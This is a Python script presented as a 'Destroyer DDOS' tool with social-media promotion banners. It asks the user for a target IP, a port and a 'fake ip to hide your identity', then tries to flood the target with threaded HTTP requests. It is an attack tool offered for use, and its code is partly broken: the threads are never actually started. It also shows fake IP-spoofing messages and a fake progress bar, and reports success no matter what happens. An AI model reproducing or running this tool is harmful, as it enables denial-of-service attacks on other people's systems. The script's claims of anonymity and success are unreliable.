import os,pyfiglet,random
import threading
import socket,colorama
from colorama import Fore
import time
black='\033[30m'
red='\033[31m'
green='\033[32m'
orange='\033[33m'
blue='\033[34m'
purple='\033[35m'
cyan='\033[36m'
lightgrey='\033[37m'
darkgrey='\033[90m'
lightred='\033[91m'
lightgreen='\033[92m'
yellow='\033[93m'
lightblue='\033[94m'
pink='\033[95m'
lightcyan='\033[96m'
all_col = [red,green,orange,cyan,lightgrey,blue,lightred,lightgreen,yellow,lightcyan,lightblue,pink]
ran = random.choice(all_col)
os.system("pip install colorama")
os.system("pip install pyfiglet")

def banner():
    os.system("clear")
    en = pyfiglet.figlet_format("Destroyer\nDDOS\n")
    print(ran, en)
    print(ran + "\n\t\tV_2.1\t\n\n")

    print(Fore.CYAN, "- " * 4, " [+] Follow me on Instagram @saadkhan041 ", "- " * 4)
    print(Fore.LIGHTYELLOW_EX, "\n", "- " * 4, " [+] Follow me on Instagram @coding_memz ", "- " * 4)
    print(Fore.LIGHTRED_EX, "\n", "- " * 4, "[+] Github: https://github.com/Saadkhan041/ ", "- " * 3)

banner()


def ddos(port=80):
    try:
        stream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        stream.connect((target, port))
        stream.sendto((f"GET /{target} HTTP/1.1\r\n").encode("ascii"), (target, port))
        stream.sendto(f"HOST: {fake_ip}\r\n\r\n".encode("ascii"), (target, port))
        stream.close
    except ValueError:
        port = 80
        print(f"{ran4}You skipped the name of port :-(")

    except KeyboardInterrupt:
        print(f"{ran}Have a Good Day :-)")

    except TimeoutError:
        print("Requests sent successfully\n\nServer timed out!!!!")

    except ConnectionRefusedError:
        print(ran, "You've typed wrong ip address")




cont =" "
while cont != "n" and "no":
    print(Fore.LIGHTYELLOW_EX+ "\n\t\t[1] DDOS Attack\n\t\t[2] Exit\n ")

    choice = input(ran + "Enter your choice: ")
    if choice == "1":
        target = input(ran + "\nEnter Target ip: ")
        try:

            port = int(input(f"{ran}\nEnter port number [default port is 80]: "))
        except ValueError:
            port = 80
            print(f"{ran} \nPort 80 is selected ")
        else:
            print(f"{ran}\nport {port} is selected! ")

        fake_ip = input(f"{ran}\nType fake ip to hide your identity: ")

        range_of_req = int(input(f"{ran}\nEnter the range of requests: "))

        print(lightred, "\nWait untill all requests are sent" + ("_ " * 10))
        ddos(port)
        print(lightblue, "\nChanging Your ip to:", fake_ip)
        print(cyan, "\nConnecting to port! ")
        print(pyfiglet.figlet_format("\tAttack\n\tStarting"))

        for i in range(range_of_req):
            thr = threading.Thread(target=ddos)
            thr.start

        print(ran, "[                    ] 0% ")
        time.sleep(3)
        print(ran, "[=====               ] 25%")
        time.sleep(2)
        print(ran, "[==========          ] 50%")
        time.sleep(3)
        print(ran, "[===============     ] 75%")
        time.sleep(2)
        print(cyan, "[====================] 100%")
        time.sleep(3)

        print(f"{ran}\n\n\r[+] DDOS done successfully! \n\n")

    elif choice == "2":
        print(ran + "\n\tDont Forget to do following tasks :-)\t\n")
        print(Fore.CYAN, "- " * 4, " [+] Follow me on Instagram @saadkhan041 ", "- " * 4)
        print(Fore.LIGHTYELLOW_EX, "\n", "- " * 4, " [+] Follow me on Instagram @coding_memz ", "- " * 4)
        print(Fore.LIGHTRED_EX, "\n", "- " * 4, "[+] Github: https://github.com/Saadkhan041/ ", "- " * 3)
        exit()

    else:
        print(ran + "\nInvalid option")
        exit()
    cont = input(ran + "\nDo you want to continue? [y/n]:")

    if cont == "y":
        os.system("clear")
        banner()



    




